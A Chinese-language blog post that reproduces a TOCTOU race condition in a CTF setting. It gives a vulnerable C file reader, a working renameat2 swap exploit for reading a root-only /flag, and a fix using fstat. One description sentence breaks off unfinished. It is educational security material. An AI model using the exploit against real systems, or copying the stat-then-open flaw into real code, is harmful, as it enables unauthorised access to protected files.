今天有点无聊在 YouTube 上瞎看

看到了 liveoverflow 的一个视频，提到 [TOCTOU](https://cwe.mitre.org/data/definitions/367.html) ，所以打算复现一下

via: 

demo 代码：

via: https://gist.github.com/LiveOverflow/590edaf5cf3adeea31c73e303692dec0

```c
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char* argv[]) {
    int fd;
    int size = 0;
    char buf[256];

    if(argc != 2) {
        printf("usage: %s <file>\n", argv[0]);
        exit(1);
    }

    struct stat stat_data;
    if (stat(argv[1], &stat_data) < 0) {
        fprintf(stderr, "Failed to stat %s: %s\n", argv[1], strerror(errno));
        exit(1);
    }

    if(stat_data.st_uid == 0)
    {
        fprintf(stderr, "File %s is owned by root\n", argv[1]);
        exit(1);
    }

    fd = open(argv[1], O_RDONLY);
    
    if(fd <= 0)
    {
        fprintf(stderr, "Couldn't open %s\n", argv[1]);
        exit(1);
    }

    do {
        size = read(fd, buf, 256);
        write(1, buf, size);
    } while(size>0);

}
```

代码看起来是没有什么问题的

题目：

flag 位于 根目录：/flag

所有者：root

权限：0600 （只有所有者能读写）

给出的一个由上面源代码编译出来的 可执行文件，可执行文件的







exp:

```c
#define _GNU_SOURCE
#include <stdio.h>
#include <fcntl.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/syscall.h>
#include <linux/fs.h>

// source https://github.com/sroettger/35c3ctf_chals/blob/master/logrotate/exploit/rename.c
int main(int argc, char *argv[]) {
  while (1) {
    syscall(SYS_renameat2, AT_FDCWD, argv[1], AT_FDCWD, argv[2], RENAME_EXCHANGE);
  }
  return 0;
}
```





fix:

```c
#include <string.h>
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

int main(int argc, char* argv[]) {
    int fd;
    int size = 0;
    char buf[256];

    if(argc != 2) {
        printf("usage: %s <file>\n", argv[0]);
        exit(1);
    }

    fd = open(argv[1], O_RDONLY);

    if(fd <= 0)
    {
        fprintf(stderr, "Couldn't open %s\n", argv[1]);
        exit(1);
    }

    struct stat stat_data;
    if (fstat(fd, &stat_data) < 0) {
        fprintf(stderr, "Failed to stat %s: %s\n", argv[1], strerror(errno));
        exit(1);
    }

    if(stat_data.st_uid == 0)
    {
        fprintf(stderr, "File %s is owned by root\n", argv[1]);
        exit(1);
    }

    
    do {
        size = read(fd, buf, 256);
        write(1, buf, size);
    } while(size>0);

}
```

